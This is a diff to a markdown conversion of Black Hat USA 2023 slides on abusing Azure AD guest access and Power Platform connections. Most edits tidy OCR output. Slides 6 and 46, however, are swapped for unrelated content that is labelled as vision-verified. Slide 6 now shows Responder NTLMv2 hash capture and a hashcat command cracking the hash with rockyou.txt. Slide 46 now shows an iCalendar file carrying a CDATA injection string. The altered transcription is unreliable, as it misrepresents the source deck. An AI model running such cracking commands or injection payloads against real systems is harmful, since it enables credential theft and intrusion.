@@ -8,18 +8,25 @@ year: 2023
 source_pdf: "Black Hat USA 2023 slides/Michael Bargury_All You Need is Guest.pdf"
 pages: 200
 sha256: "8c407927e0d1d85bce6f156d4d2d03dbf1539124cb2f9229e3c7f56e8b10936c"
-text_chars: 101638
-ocr_pages: 124
+text_chars: 83946
+ocr_pages: 111
 has_ocr: true
+redacted_secrets: 0
+ocr_confidence: 87.4
+ocr_unreliable_blocks: 0
+vision_verified_blocks: 7
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T21:22:37Z"
+converted_at: "2026-08-12T04:18:42Z"
 ---
 # All You Need is Guest
 
 **Speakers:** Michael Bargury  
 **Conference:** Black Hat USA 2023  
 **Source:** `Black Hat USA 2023 slides/Michael Bargury_All You Need is Guest.pdf` (200 pages)
+
 
 ## Slide 1
 
@@ -29,10 +36,10 @@ Michael Bargury @mbrg0 Zenity
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-pifek hat
 USA &
 AUGUST 9-10, ©0253
 BRIEFINGS
@@ -50,24 +57,14 @@ Zenity
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-pifek hat
-USA &
-@mbrgO
-#BHUSA @BlackHatEvents
-```
-
 ## Slide 3
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Q
-black hat
 g Zenity Demo invited you to access applications within their organization ‘External @ @
 * © Microsoft Invitations on behalf of Zenity Demo <invites@microsoft.con F 28, 4:32PM (6 day ) a)
 © Feat) to | ker6, me +
@@ -78,19 +75,12 @@ v
 Organization: Zenity Demo
 an Domain: zenitydemo.onmicro
 e
-BS
 e
-S
 If you accept this invitation, you'll be sent to https://myapplications .microsoft.com/?tenantid=fc993b0f-345b-4d01-9f67-
-> Sac 143
 »
 » Accept invitat
-»
-»
 . Block future invitations from this organization
-B®
 e This invitation email is from Zenity Demo (Zenitydemo.onmicrosoft.com) and may include advertising content
-BS
 Zenity Demo has not provided a link to their privacy statement for you to review. Microsoft Corporation facilitated
 sending this email but did not validate the sender or the message.
 ```
@@ -99,12 +89,10 @@ sending this email but did not validate the sender or the message.
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Q
-black hat
-USA 2023
 My Apps
 Apps ; Zenity Demo oa
 This is unavailable due to your
@@ -118,12 +106,10 @@ hackerS@pwnt nmicr
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Q
-black hat
-USA 2&0es3
 powerpwn - Credentials
 All Resources
 Credentials
@@ -131,12 +117,10 @@ Automations
 Applications
 Connectors
 Connector Connection Created by
-shared _azurefile jamieredingcustomerdata.file.core.windows.net Jamier@zenitydemo.onmicrosoft.com
 © = shared _azureblob https://enterpriseip.blob.core.windows.net/patentarchive jamier@zenitydemo.onmicrosoft.com
 shared azuretables jamieredingcustomerdata.table.core.windows.net/customers jamier@zenitydemo.onmicrosoft.com
 shared azurequeues Azure Queues jamier@zenitydemo.onmicrosoft.com
 B shared sql enterprisefinancial financialreports.database.windows.net hi@pwntoso.onmicrosoft.com
-Bi sshared sql enterprisecustomers jamier@zenitydemo.onmicrosoft.com
 customercareinsights.database.windows.net
 Playground Raw
 Dump
@@ -149,50 +133,67 @@ Dump
 Playground Raw
 Dump
 Playg
-rOun) aa fee (ump
 ```
 
 ## Slide 6
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 70/100 on the text kept, 62/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-bisek hat
-USA 2023
-[{"@odata.etag": "", "ItemInternalId": "7eb41684-4b64-4f39-9eab-90fbe3@ba62c", "CustomerID": 34553, "FirstName": "Jamie", "LastName":
-"Reding", "Email": "jamier@zenitydemo.OnMicrosoft.com", "SocialSecurityNumber": "209-97-1111"}, {"@odata.etag": "", "“ItemInternalId":
-"566a2e62-1c95-4e49-bdc6-c141023d66ac", "CustomerID": 98256, "FirstName": "Christa", "LastName": "Geller", “Email”:
-"“christag@zenitydemo.OnMicrosoft.com", "SocialSecurityNumber": "209-97-2222"}, {"@odata.etag": "", "“ItemInternalId": "43288280-ae24-45@e-
-9feb-f6605d9clec2", "CustomerID": 76234, “FirstName”: "David", “LastName”: "Brenner", “Email”: "“davidb@zenitydemo.OnMicrosoft.com",
-"SocialSecurityNumber": "209-97-3333"}, {"@odata.etag": "", “ItemInternalId": "“52f7ad4a-9159-486e-885c-69c78fa59138", "CustomerID": 43256,
-"FirstName": "Laura", “LastName”: "Miller", "Email": "“lauram@zenitydemo.OnMicrosoft.com", "“SocialSecurityNumber": "209-97-4444"},
-{"@odata.etag": "", "ItemInternalId": "e53da160-f087-4e08-b3fb-eb16283781c5", "CustomerID": 67322, "FirstName": "Robert", "LastName":
-"Thompson", "Email": "“robertt@zenitydemo.OnMicrosoft.com", "SocialSecurityNumber": "2@9-97-5555"}, {"@odata.etag": "", "ItemInternalId":
-"£6ce0c32-b846-4c4a-ad61-2f3bf74dede6", "CustomerID": 78654, "FirstName": "Amanda", "LastName": "Smith", “Email”:
-"amandas@zenitydemo.OnMicrosoft.com", "SocialSecurityNumber":; "209-97-6666"}, {"@odata.etag": "", "“ItemInternalId": "e998798e-2e21-4e8f -
-b3e6-2ff7fde41510", "CustomerID": 89322, "FirstName": "John", "LastName": "Davis", "Email": "johnd@zenitydemo.OnMicrosoft.com",
-"SocialSecurityNumber": "209-97-7777"}, {"@odata.etag": "", “ItemInternalId": "9219f@91-1238-4cf8-b9a7-f4b7e3f3a958", "CustomerID": 11245,
-"FirstName": "Emily", "LastName": "Harris", “Email”: "“emilyh@zenitydemo.OnMicrosoft.com", "“SocialSecurityNumber": "209-97-8888"},
-{"@odata.etag": "", “ItemInternalId": "8ba98fcc-b7f8-401f-abf5-842065f37d56", "CustomerID": 55677, "FirstName": "Michael", “LastName”:
-"Sanders", "Email": "michaels@zenitydemo.OnMicrosoft.com", "SocialSecurityNumber": "2@9-97-9999"}, {"@odata.etag”: "", "ItemInternalId":
-"425f5a25-0f8d-4295-a3bf-7ab0388f8d7a", “CustomerID”: 68984, “FirstName”: "Sophie", “LastName”: "Carter", “Email”:
-"“sophiec@zenitydemo.OnMicrosoft.com", "SocialSecurityNumber": "209-97-0000"}, {"@odata.etag": "", “ItemInternalId": "07c@f4f1-1b45-4@d4-
-ba@5-9a1a6c15768f", "CustomerID": 45779, "FirstName": "Stephen", "LastName": "Williams", "Email": "stephenw@zenitydemo.OnMicrosoft.com",
-"SocialSecurityNumber": "209-97-1234"}, {"@odata.etag": "", “ItemInternalId": “e270c995-1132-4900-afe1-f745fdb38452", "CustomerID": 23456,
-"FirstName": "Olivia", “LastName”: "Lee", “Email”: “olivial@zenitydemo.OnMicrosoft.com", "“SocialSecurityNumber": "209-97-4321"},
-{"@odata.etag": "", "“ItemInternalId": "6bdala1f-b705-4a3d-a392-856c9c286c73", "CustomerID": 64784, "FirstName": "Patricia", “LastName”:
-"Foster", "Email": "“patriciaf@zenitydemo.OnMicrosoft.com", "SocialSecurityNumber": "2@9-97-9876"}, {"@odata.etag”: "", "ItemInternalId":
-"9dd9e288-b96d-45de-9b3d-5bd7572e8cc4", "CustomerID": 34598, "FirstName": "Daniel", “LastName": “Brown", “Email”:
-"“danielb@zenitydemo.OnMicrosoft.com", "SocialSecurityNumber": "209-97-6789"}, {"@odata.etag": "", "“ItemInternalId": "“b6884c5e-3c43-49ca-
-b341-aefOcfofSeff", "CustomerID": 79000, "FirstName": "Elizabeth", “LastName”: "Perez", "Email": "“elizabethp@zenitydemo.OnMicrosoft com"
-"SocialSecurityNumber": "209-97-7890"}, {"@odata.etag": "", "ItemInternalId": "9a265@d6-693a-45e8-b8@c-4995a9d@54af", “Customer
-"FirstName": "Jason", “LastName”: "Mitchell", "Email": "jasonm@zenitydemo.OnMicrosoft.com", "SocialSecurityNumber": "29-97-09
-{"@odata.etag": "", "ItemInternalId": "bc932b1b-5ff2-4c8d-a28f-6ac86eed4529", “CustomerID": 74321, "FirstName": "Sarah", "Last
-"Gonzalez", "Email": "“sarahg@zenitydemo.OnMicrosoft.com", "SocialSecurityNumber": "209-97-5678"}, {"@odata.etag": "", "ItemInt
-"12857b5e-8cdc-49ee-961d-2b47adbif6ae", "CustomerID": 97654, "FirstName": "Thomas", "LastName": "Martin", "Email":
-Ee ee 6 eee ee ee eee ee | | A ee et Ee ee eee ee Haan ATW aware ruA.4de2e 2-4. un re rete IT. Neti atfaean Lane anar
+INTRO    CASE STUDIES    ATTACKS    DEFENCE    AUTOMATION
+
+Desktop Credential Compromise
+
+[left panel - Responder SMB output]
+[SMB] NTLMv2-SSP Client   : 192.168.18.129
+[SMB] NTLMv2-SSP Username : .\User
+[SMB] NTLMv2-SSP Hash     : User::.:62ec61be6fd3f441:7[obscured]
+8271E:01010000000000008067A3DAB3FBD90162BC599FA75E807A[obscured]
+00510001001E00570049004E002D0054004400530054004D003700[obscured]
+00570049004E002D0054004400530054004D003700460041005400[obscured]
+002E004C004F00430041004C00030014004A004300470051002E00[obscured]
+004A004300470051002E004C004F00430041004C00070008008067[obscured]
+
+[right panel - hashcat console]
+PS C:\Users\User\Desktop\hashcat-6.1.1> .\hashcat.exe -a 0 -m 5600 .\hash.txt .\rockyou.txt -w 3 -O
+hashcat (v6.1.1) starting...
+
+OpenCL API (OpenCL 2.1 AMD-APP (3516.0)) - Platform #1 [Advanced Micro Devices, Inc.]
+====================================================================================
+* Device #1: Ellesmere, 8128/8192 MB (6745 MB allocatable), 32MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 27
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers applied:
+* Optimized-Kernel
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 626 MB
+
+Dictionary cache hit:
+* Filename..: .\rockyou.txt
+* Passwords.: 14345042
+* Bytes.....: 139927340
+* Keyspace..: 14345042
+
+USER::.:62ec61be6fd3f441:7fad17e80b2bb6146ede37a40548271e:01010000000000008067a3dab3fbd90162bc599fa[obscured]
+2d0054004400530054004d00370046004100540049004c0004003400570049004e002d0054004400530054004d003700460[obscured]
+00030014004a004300470051002e004c004f00430041004c00050014004a004300470051002e004c004f00430041004c000[obscured]
+00000100000000200000a74a588690d6960504aa1d55f090070980ea44ea46155bbe709a8c885673a3f60a0010000000000[obscured]
+0032002e003100360038002e00310038002e00310032003800000000000000000000:Password1
 ```
 
 ## Slide 7
@@ -221,16 +222,6 @@ Ee ee 6 eee ee ee eee ee | | A ee et Ee ee eee ee Haan ATW aware ruA.4de2e 2-4. 
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-black hat
-LUISA eO
-WHY invite guests in?
-@mbrgO
-#BHUSA @BlackHatEvents
-```
-
 ## Slide 9
 
 ## How can two parties collaborate over a bunch of files?
@@ -241,10 +232,10 @@ Small vendor
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 57/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-pifeK hat
 How can two parties collaborate over a
 bunch of files?
 POC Kickoff
@@ -328,21 +319,13 @@ F1000 tenant
 
 @mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 75/100 on the text kept, 58/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-black hat SS cs
-USA 20e53
 © excel | Microsoft 365 +) Chat| Microsoft Teams Xp SharePoint @ Home - OneDrive @ Home - Microsoft Entra admin c | tt Yammer - Feed
-dove & teams.microsoft.com/_#/conversations/newchat?ctx=chat
-R
-@
-S$
-0
 Establishing secure connection.
 13/07/2023 ™
-@mbrg0
-#BHUSA GBlackHatEvents
 ```
 
 ## Slide 19
@@ -353,11 +336,10 @@ Source: @_dirkjan at BHUSA 2022
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 HJ M invited you to access applications within their organization
 o Microsoft Invitations on behalf of iminyourcloud <invites@microsoft.com>
 To: Invite Me
@@ -410,15 +392,14 @@ Source: @_dirkjan at BHUSA 2022
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Q
 blackhat
 (a) It’s
 super easy Perhaps too easy?
 to geta PS
-guest met 4
 account
 Dirk-jan Mollema / @_dirkjan
 ```
@@ -442,20 +423,6 @@ Partners, vendors, suppliers, other collaborators
 F1000 tenant
 
 #BHUSA @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-pifeK hat
-USA 20e53
-(b) Understanding how control works
-aG neure AD
-ae =:
-@ Fil
-a &
-Partners, vendors, suppliers, F1000 tenant
-other collaborators
-```
 
 ## Slide 25
 
@@ -543,22 +510,16 @@ Insert expectation vs reality meme
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20253
-a
-; Teams = F :
-Activity Vay Vendor onboarding ~
 Vendor onboarding
 © Your teams
 Chat
 coe Vendor onboarding a Members Pending Requests Channels Settings Analytics Apps Tags
-(op
 Teams This team has guests.
 diane Search for members Q & Add member
-G * Owners (1)
 Calls
 Name Title Location Tags @ Role
 Files
@@ -574,11 +535,10 @@ Help
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-pisek hat
-USA 20253
 Add members to Vendor onboarding
 Start typing a name, distribution list, or security group to add to your team. You can
 also add people outside your organization as guests by typing their email addresses.
@@ -589,11 +549,10 @@ Ktart typing a name or group
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-pisek hat
-USA 20253
 Add members to Vendor onboarding
 Start typing a name, distribution list, or security group to add to your team. You can
 also add people outside your organization as guests by typing their email addresses.
@@ -606,11 +565,10 @@ o__ Add hacker5@pwntoso.onmicrosoft.com as a
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-pisek hat
-USA 20253
 Add members to Vendor onboarding
 Start typing a name, distribution list, or security group to add to your team. You can
 also add people outside your organization as guests by typing their email addresses.
@@ -624,11 +582,10 @@ your member list.
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 Microsoft
 Sign in
 hacker5@pwntoso.onmicrosoft.com
@@ -642,14 +599,11 @@ Q Sign-in options
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-USA 20e53
 Microsoft
-hacker5 @pwntoso.onmicrosoft.com
 Permissions requested by:
 Zenity Demo
 zenitydemo.onmicrosoft.com
@@ -669,12 +623,10 @@ This resource is not shared by Microsoft.
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-USA 20e53
 My Apps v P& Search apps ea 2 H
 Apps x Zenity Demo Sign out
 Apps dashboard A
@@ -733,45 +685,47 @@ Go have an early lunch
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-Q
-black hat
-USA 20e53
-Welcome to Power x
-Apps
-ow
-```
-
 ## Slide 46
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 93/100 on the text kept, 80/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-bisek hat
-USA 20253
-Ci} al
-Sorry, there's been a disconnect
-AHh
-The environment 'Default-fc993b0f-345b-4d01-9f67-9ac4a140dd43' could not be found in the tenant '420983fd-32b0-4abd-89e0-c3ef3236fc73'.
-Go to home page
+BEGIN:VCALENDAR
+PRODID:-//caldav.icloud.com//CALDAVJ 2116B554//EN
+VERSION:2.0
+BEGIN:VEVENT
+DTEND;TZID=Europe/London:202009[obscured]
+ORGANIZER;CN=[obscured];EMAIL=[obscured]@icloud.com:[obscured]
+[obscured]/principal/
+UID:[obscured]
+DTSTAMP:202103[obscured]
+LOCATION:Home
+SEQUENCE:1
+SUMMARY:Meeting
+LAST-MODIFIED:[obscured]
+DTSTART;TZID=Europe/London:202009[obscured]
+CREATED:202103[obscured]
+ATTENDEE;CN=[obscured];CUTYPE=INDIVIDUAL;PARTSTAT=ACCEPTED;ROLE=CHAIR;
+ EMAIL=[obscured]@icloud.com:[obscured]
+[obscured]/principal/
+DESCRIPTION]]>:x
+ATTENDEE;EMAIL=[obscured];CN=[obscured]:[obscured]
+[obscured]/principal/
+ATTENDEE<![CDATA[:Notes
 ```
 
 ## Slide 47
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 B+ ®
-|
-@
-bisek hat
-USA 20253
 Power Apps
 Home
 Create
@@ -815,13 +769,11 @@ Beginner
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20253
 Environment
-HS
 v Welcome, Hacker5!
 + Create
 Create apps that connect to data, and work across web and mobile.
@@ -850,11 +802,10 @@ Beginner 51 min Beginner 42 min Intermediate Thr 4 min Beginner
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20253
 Environment
 Power Apps & pwntoso (default)
 y + Pwntoso Sign out
@@ -867,7 +818,7 @@ View account
 ays to create ana
 y PP Switch directory
 Flows
-XY) Solutions Start with data Start with a page design —.  Starcwitrrarrapptemprate
+XY) Solutions Start with data Start with a page design —. Starcwitrrarrapptemprate
 6 Create a table, pick an existing one, or even import from Excel to faa Select from a list of different designs and layouts to get your Select from a list of fully-functional business app templates. Use
 * More create an app app going. as-is or customize to suit your needs.
 e Power Platform
@@ -888,24 +839,20 @@ Beginner 51 min
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 Environment
 & Try the new Power Apps
 | fm Home a
 . Welcome, Hacker5!
 Create
 Create apps that connect to data, and work across web and mobile.
-(0) Learn
 aia Settings Directories
 — Tables Directories ©
 Ways to create an app Language and time y you choose will imr s that are avail he
 Plas Notifications
-. Current directory G 5
-al 7
 NI Solutions Start with data Directories pumnicea tt with an app template
 Create a table, pick an exist) ict from a list of fully-functional business app templates. Use
 ~ More create an app. All Directories 5 or customize to suit your needs.
@@ -924,27 +871,22 @@ Beginner 51min i al 42 min Ww intermediate Thr4 min Beginner
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20253
 Environment
 — ! New connection Pp Search
 fy Home . . .
 Connections in Zenity Demo (default)
 + Create
-Canvas
 LU) Learn
 EP NEE Name Modified Status
 fA Tables @| https://enterpriseip.blob.core.windows.net/patentarchive 11 min ago Connected
 Azure Blob Storage
-o/* Flows
 jamieredingcustomerdata file.core.windows.net 10 min ago Connected
 Al, solutions Azure File Storage
 | s) Connections a fr) nonceeuee 3 wk ago Connected
-More . . .
-Coe able og corewindows ne y/cust 14 min ago Connected
 e Power Platform
 enterprisefinancial financialreports.database.windows.n... 20 min ago Connected
 SQL Server
@@ -956,28 +898,21 @@ SQL Server
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20253
 - Environment
-Power Apps B zenityDemo (eft
 — ! New connection L Edit \@ Share | Delete @ Details
 fn} Home . . .
 Connections in Zenity Demo (default)
 { Create
-Canvas
 () Learn
 oe Apps Name Modified Status
-&3 Tables @| have bob Senege en mewindousnct/patentarcnive 13 min ago Connected
 u
-o/” Flows
 (-) jamieredingcustomerdata file.core.windows.net 12 min ago connected
 All solutions Azure File Storage
 | & Connections aA iia) mae uses 3 wk ago Connected
-u ueu
-More oo .
 jamieredingcustomerdata.table.core.windows.net/cust... 16 min ago Connected
 Azure Table Storage
 €& Power Platform
@@ -991,28 +926,21 @@ SQL Server
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20253
-_ Environment
 — | New connection gO Edit \@ Share i] Delete @ Details
 {ny Home . . .
 Connections in Zenity Demo (default)
 ! Create
-J Canvas
-LU) Learn
 oe AGRE Name Modified Status
 f# Tables @| https://enterpriseip.blob.core.windows.net/patentarchive 14 min ago Connected
 Azure Blob Storage
-o/” Flows
 rv) jamieredingcustomerdata file.core.windows.net 13 min ago Connected
 All solutions Azure File Storage
-& Edit
 | % Connections A i Azure Queues Connected
 Azure Queues \@ Share
-More . . - ii Delet
 jamieredingcustomerdata.table.core.windows.net/cust... elete Connected
 Azure Table Storage
 € Power Platform © Details
@@ -1026,11 +954,10 @@ SQL Server
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-pis hat
-USA 20253
 Share jamieredingcustomerdata.file.core.windows.net
 Enter nan ail addr
 Shared with
@@ -1045,28 +972,24 @@ principal app Id
 Permission Q)
 Can use \ [x]
 Owner
-[ene]
 ```
 
 ## Slide 55
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-pis hat
-USA 20253
 Share jamieredingcustomerdata.file.core.windows.net
 Enter names, email add
 Shared with
 Name
 6:9) Shared with org
 amie Reding
-Q jamiercontoso
 Jser groups, service principa names
 Or se
-rvi
 ce principal app Ic
 ```
 
@@ -1074,29 +997,21 @@ ce principal app Ic
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 79/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20253
 - Environment
-Power Apps & zenity Demo (deta
 — ! New connection gO Edit \@ Share [ii] Delete @ Details
 fy Home . . .
 Connections in Zenity Demo (default)
 { Create
-J Canvas
-() Learn
 oe ABDE Name Modified Status
 &3 Tables @| https://enterpriseip.blob.core.windows.net/patentarchive 19 min ago Connected
 Azure Blob Storage
-o/” Flows
 () jamieredingcustomerdata.file.core.windows.net 18 min ago Connected
 All solutions . Azure File Storage
-> Edit
 Connections a Azure Queues C ted
-| Y fr) Azure Queues \@ Share onnects
-More oo. . - ii Delet
 jamieredingcustomerdata.table.core.windows.net/cust... elete Connected
 Azure Table Storage
 €& Power Platform © Details
@@ -1110,20 +1025,17 @@ SQL Server
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20253
 — £ Edit \@ Share Ill] Delete
 Connections > jamieredingcustomerdata.file.core.windows.net
 | Create
 ( Learn Details Apps using this connection Flows using this connection
 EP Apps Connector name
 Azure File Storage
-f4 Tables
 Description
-o/* Flows
 Microsoft Azure Storage provides a massively scalable, dur
 AX] Solutions
 | % Connections +
@@ -1136,28 +1048,23 @@ Created
 7/6/2023, 2:30:34 PM
 Modified
 7/2023, 11:48:49 PM
-Ni
 ```
 
 ## Slide 58
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20253
-Environme!
 — £ Edit \@ Share Ill] Delete
 Connections > jamieredingcustomerdata.file.core.windows.net
 | Create
 ( Learn Details Apps using this connection Flows using this connection
 EP Apps Connector name
 Azure File Storage
-f4 Tables
 Description
-o/* Flows
 Microsoft Azure Storage provides a massively scalable, durat
 AX] Solutions
 | % Connections +
@@ -1175,20 +1082,17 @@ Modified
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20253
 Power Apps
 Home
 + ®
 Create
 B
 Learn
-H
 Apps
-a
 Tables
 Flows
 AX] Solutions
@@ -1259,33 +1163,21 @@ Michael Bargury RSAC 2023
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-pifek hat
-USA &
-@mbrgO
-#BHUSA @BlackHatEvents
-```
-
 ## Slide 64
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20253
 — £ Edit \@ Share Ill] Delete
 Connections > jamieredingcustomerdata.file.core.windows.net
 | Create
 ( Learn Details Apps using this connection Flows using this connection
 EP Apps Connector name
 Azure File Storage
-f4 Tables
 Description
-o/* Flows
 Microsoft Azure Storage provides a massively scalable, dur
 AX] Solutions
 | % Connections +
@@ -1298,20 +1190,16 @@ Created
 7/6/2023, 2:30:34 PM
 Modified
 7/2023, 11:48:49 PM
-Ni
 ```
 
 ## Slide 65
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 77/100 on the text kept, 66/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20253
-- Environment
-Power Apps & zeniy demo (eto
 — £ Edit \@ Share Ill] Delete 2 Search
 Connections > jamieredingcustomerdata.file.core.windows.net
 { Create
@@ -1330,11 +1218,10 @@ More
 
 #BHUSA @BlackHatEvents
 
